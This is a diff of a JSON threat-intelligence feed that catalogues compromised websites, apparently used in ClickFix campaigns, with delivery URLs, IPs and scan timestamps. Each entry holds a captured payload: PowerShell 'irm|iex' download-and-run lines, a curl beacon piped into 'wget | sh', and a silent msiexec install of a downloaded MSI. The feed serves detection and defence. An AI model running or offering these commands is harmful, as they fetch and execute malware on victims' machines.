@@ -1,5 +1,99 @@
 [
   {
+    "UrlDomain": "dawahthreads.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes",
+      "base.gateway.tenderly.co"
+    ],
+    "PayloadUrl": [
+      "http://timelevel12.com/big"
+    ],
+    "IP": [
+      "144.126.194.248"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/deb16e74de52341f",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://base.gateway.tenderly.co",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/deb16e74de52341f'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/deb16e74de52341f"
+    ],
+    "ReportId": "cmwkxa7s51h0n0oml0o4c58dz",
+    "ScannedAt": "2026-11-17T16:44:32.151000+00:00"
+  },
+  {
+    "UrlDomain": "shakambrigroup.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes",
+      "script.google.com",
+      "script-six-tawny.vercel.app"
+    ],
+    "PayloadUrl": [
+      "https://script-six-tawny.vercel.app/lin",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/win"
+    ],
+    "IP": [
+      "82.112.239.130"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=b842e077-96de-48a6-a60a-ef65efe3722d&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fshakambrigroup[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-17T16%3A38%3A34.366Z&lastShellAt=2026-11-17T16%3A38%3A34.366Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin"
+    ],
+    "ReportId": "cmwkx4azd1gvm0oml0vqhoa4u",
+    "ScannedAt": "2026-11-17T16:39:56.362000+00:00"
+  },
+  {
+    "UrlDomain": "ledsystemllc.com",
+    "DeliveryUrl": [
+      "gfisoda.biz"
+    ],
+    "PayloadUrl": [
+      "https://gfisoda.biz/clickfix/8e15947cbef29c2d"
+    ],
+    "IP": [
+      "46.242.243.10"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex",
+    "ResolvedDownloadUrl": [
+      "https://gfisoda.biz/clickfix/8e15947cbef29c2d"
+    ],
+    "ReportId": "cmwkwv0pz1gqc0omlgxi8bnwj",
+    "ScannedAt": "2026-11-17T16:32:43.152000+00:00"
+  },
+  {
+    "UrlDomain": "goyardde.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "188.114.96.0"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/a8c0c6760a752b5e",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/a8c0c6760a752b5e'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/a8c0c6760a752b5e"
+    ],
+    "ReportId": "cmwkwqmbs1glr0omlra35kmei",
+    "ScannedAt": "2026-11-17T16:29:17.872000+00:00"
+  },
+  {
     "UrlDomain": "estilumocr.mochileroscostarica.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -6272,97 +6366,5 @@
     ],
     "ReportId": "cmwdt7rly04sw0oml797g7obw",
     "ScannedAt": "2026-11-12T17:16:16.187000+00:00"
-  },
-  {
-    "UrlDomain": "www.jarthursmith.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "blessedwirrow.org",
-      "apiexplorerzone.com",
-      "simplecopseholding.com",
-      "javascriptbasics.com",
-      "digdonger.org",
-      "parserapiprocess.com",
-      "fetchapiutility.com",
-      "newgoodfoodmarket.com",
-      "taskrunnersrvmod.com",
-      "cronapiworkersvc.com"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "198.71.232.7"
-    ],
-    "Related": [
-      {
-        "Value": "https://blessedwirrow.org/qlzvfjfnsjfacbqafa8yg",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://apiexplorerzone.com/ckxdxshtxehivuhjdk6snoknbgnm3qpocizoao8cjwm",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://simplecopseholding.com/jwctaonomvvewlrkcujn6pf-aopgxjy",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://javascriptbasics.com/ql47k60lp5cvuktygfwp1xbnu0bhaocvl70kid1kbbd",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://digdonger.org/87cblkdce4fkkwg3pse6smsugo3vtjtu61o5dv8jon1",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://parserapiprocess.com/flr1uzpkaflwiwyrrq4ncoew3ssq87ztg-t7vlpnz4u",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://fetchapiutility.com/zrrvdxj3zu7awavigi8unoo0x5s7wrpgxb44xmfwqbz5-t",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://newgoodfoodmarket.com/x5itbyecdrzi2yp1ob1ke046ds2izeg49excr8alhq9",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://taskrunnersrvmod.com/ykutz6vjmcpqhclzicjjk6ds1gqtzcvwirjqtk-fvtxuivrcfj",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://cronapiworkersvc.com/enmt0kv4oil779uv5atyhsznue-cevzct1bnix4",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-cloud.codes/5d69fe5eb757ed96",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/5d69fe5eb757ed96'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/5d69fe5eb757ed96"
-    ],
-    "ReportId": "cmwdsgbm604qt0oml3owfisgv",
-    "ScannedAt": "2026-11-12T16:54:55.751000+00:00"
-  },
-  {
-    "UrlDomain": "quaideazamcollege.com",
-    "DeliveryUrl": [
-      "cranjis.com",
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "77.37.53.189"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwds9z2204os0omlpy5c0lbi",
-    "ScannedAt": "2026-11-12T16:49:59.425000+00:00"
   }
 ]
